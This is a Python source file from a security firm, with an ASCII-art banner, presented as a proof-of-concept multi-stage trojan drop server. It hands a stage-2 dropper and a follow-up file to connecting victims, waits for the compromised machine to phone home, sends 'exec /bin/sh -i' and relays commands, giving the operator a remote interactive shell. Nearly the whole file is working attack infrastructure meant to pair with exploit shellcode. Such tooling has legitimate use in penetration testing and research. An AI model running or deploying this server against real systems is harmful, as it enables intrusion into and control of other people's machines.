#!/usr/bin/env python
# *******************************************************************************
# *******************************************************************************
# *****************       These warez are licensed GPLv2.        ****************
# *********************    So share and respect.  Peace.   **********************
# *******************   See included LICENSE for more info.   *******************
# *******************************************************************************
# *******************************************************************************
# ************************                               ************************
# ************                                                       ************
# *********     #####   ######   #######  #######  #######  #######     *********
# *******      #     #  #     #  #        #           #          #        *******
# *******      #        #     #  #        #           #         #         *******
# *******      #  ####  ######   #####    #####       #        #          *******
# *******      #     #  #   #    #        #           #       #           *******
# *******      #     #  #   #    #        #           #       #           *******
# *******       #####   #     #  #######  #######     #     #######       *******
# *********                                                             *********
# ************                                                       ************
# ************************  From your leet hacking cr3w  ************************
# *******************************                 *******************************
# **********************************    at     **********************************
# *******************************                 *******************************
# ****                                                                       ****
# ****   TTTTTTTTTTTTTTTTTTTTTTTNNNNNNNN        NNNNNNNN   SSSSSSSSSSSSSSS   ****
# ****   T:::::::::::::::::::::TN:::::::N       N::::::N SS:::::::::::::::S  ****
# ****   T:::::::::::::::::::::TN::::::::N      N::::::NS:::::SSSSSS::::::S  ****
# ****   T:::::TT:::::::TT:::::TN:::::::::N     N::::::NS:::::S     SSSSSSS  ****
# ****   TTTTTT  T:::::T  TTTTTTN::::::::::N    N::::::NS:::::S              ****
# ****           T:::::T        N:::::::::::N   N::::::NS:::::S              ****
# ****           T:::::T        N:::::::N::::N  N::::::N S::::SSSS           ****
# ****           T:::::T        N::::::N N::::N N::::::N  SS::::::SSSSS      ****
# ****           T:::::T        N::::::N  N::::N:::::::N    SSS::::::::SS    ****
# ****           T:::::T        N::::::N   N:::::::::::N       SSSSSS::::S   ****
# ****           T:::::T        N::::::N    N::::::::::N            S:::::S  ****
# ****           T:::::T        N::::::N     N:::::::::N            S:::::S  ****
# ****         TT:::::::TT      N::::::N      N::::::::NSSSSSSS     S:::::S  ****
# ****         T:::::::::T      N::::::N       N:::::::NS::::::SSSSSS:::::S  ****
# ****         T:::::::::T      N::::::N        N::::::NS:::::::::::::::SS   ****
# ****         TTTTTTTTTTT      NNNNNNNN         NNNNNNN SSSSSSSSSSSSSSS     ****
# ****                                                                       ****
# ****                                                                       ****
# ************                http://www.tacnetsol.com                ***********
# ***************                                                  **************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMWo,:OMMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMK.    ;MMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMX,''''cMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMNxxkWM;    0MMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMM,   cM'    xMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMM0.o,.'   :X.    lMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMXcO:.'   ;k     ;MMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMXoKc.'   ;x     .MMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMM0.c..'   ;o     .MMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMWOlod'   ;l      O0MMMMMN0MMMMMMMM**************
# ***************MMMMMMMMMMMMMMM0lllld;...''......,',:;. .cNMMMMMMM**************
# ***************MMMMMMMMMMMMMOlllo:.   ...............,0MMMMMMMMMM**************
# ***************MMMMMMMMMMMOllllll;:l;   ,xXX0XXXooooollOMMMMMMMMM**************
# ***************MMMMMMMMMOlllc;;'.,.,'   ,oMMKMMMlllllllllOMMMMMMM**************
# ***************MMMMMMMOlc;,..'... .''   ,oMMKMMM;,;llllllllkWMMMM**************
# ***************MMMMMOl:'.'.....  . .'   ,oMMKMMM;''',clllllllkWMM**************
# ***************MMMOl:'.... ..   .  .'   ,oMMKMMM' ..'.'cllllllckW**************
# ***************MMdc'....  ..   .   .'   ,oMMKMMM'..  ..',llllllcx**************
# ***************MMMXl... ..    .    .'   ,oMMKMMM. .. .....cllcxNM**************
# ***************MMMMMXc  .     .    .'   ,oMMKMMM.  .   ....cxNMMM**************
# ***************MMMMMMMNl     .     .'   ,oMMKMMM'   .   . oNMMMMM**************
# ***************MMMMMMMMMNc   .  .........;xKKMMM.    . .lNMMMMMMM**************
# ***************MMMMMMMMMMMNl ...    .....   .cXM.    .lNMMMMMMMMM**************
# ***************MMMMMMMMMMMMMN; ....,  . .lkx;  k.   oWMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMK 'k.    ..  oMMKx .;.dWMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMN .KWo.      oMMXc .xWMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMM0. .,''... ',;,  ,NKMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMO:.   ...   .:KMMKMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMWKOkkx;lWMKMMMKMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMKWMKMMKWMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMKWKMNXMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMXOXNMMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWMMMMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM**************
# ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM**************
# *******************************************************************************
# *******************************************************************************
# 
# (c) 2012 Zachary Cutlip <zcutlip@tacnetsol.com,
#          Tactical Network Solutions, LLC
#  
# This is a proof-of-concept multi-stage trojan drop server.
# This program will serve two files, one each to two consecutive incomming
# connections, before waiting for a third incoming connection which connect to
# standard input/output, giving the operator an interactive session on the
# connecting machine.
# 
# The targeted use is with an exploit & shellcode that connects, downloads, 
# and excutes a trojan, which then downloads a secondary file (e.g., tftp
# client) then connects back, giving the operator an interactive shell.
#

import socket
import sys
import select
import os
import traceback
import signal

def handler(signum,frame):
    keepgoing=False

def server(ip,port):
	serversocket = socket.socket(
	socket.AF_INET,socket.SOCK_STREAM)
	serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	serversocket.bind(("0.0.0.0",int(port)))
	serversocket.listen(5)
	return serversocket

def send_file_to_client(filename,serversocket):
	data=open(filename,"r").read();
	(clientsocket,address) = serversocket.accept()
	clientsocket.send(data)
	clientsocket.close()




STARS="*******************************************************"

port=sys.argv[1]

stage2dropper=sys.argv[2]
nextfile=sys.argv[3]

signal.signal(signal.SIGINT,handler)
signal.signal(signal.SIGTERM,handler)

MAX_READ=1024

serversocket = server("0.0.0.0",port)

print >>sys.stderr,""


print STARS
print ""
print "waiting to send stage 2 dropper."
print ""
send_file_to_client(stage2dropper,serversocket)
print "Sent stage 2 dropper."
print ""
print STARS
print ""
print "waiting to send requested file."
print ""
send_file_to_client(nextfile,serversocket)
print("send requested file.")
print ""
print >>sys.stderr,STARS
print >>sys.stderr,""
print >>sys.stderr,"Waiting for connection from victim."
print >>sys.stderr,""
(clientsocket,address) = serversocket.accept()
print >>sys.stderr,STARS
print >>sys.stderr,""
print >>sys.stderr,"Victim has phoned home."
print >>sys.stderr,""

inputlist=[clientsocket,sys.stdin]

keepgoing=True
clientsocket.send("exec /bin/sh -i\n")
while keepgoing:
    try:
        inp,outp,excep=select.select(inputlist,[],[])
        for f in inp:
            if f is clientsocket:
                data=f.recv(MAX_READ)
                if data:
                    sys.stdout.write(data)
                    sys.stdout.flush()
            else:
                data=sys.stdin.readline()
                if data:
                    clientsocket.send(data)
    except Exception as e:
        keepgoing=False


print >>sys.stderr,"closing connection."


clientsocket.close()
serversocket.close()

print ""

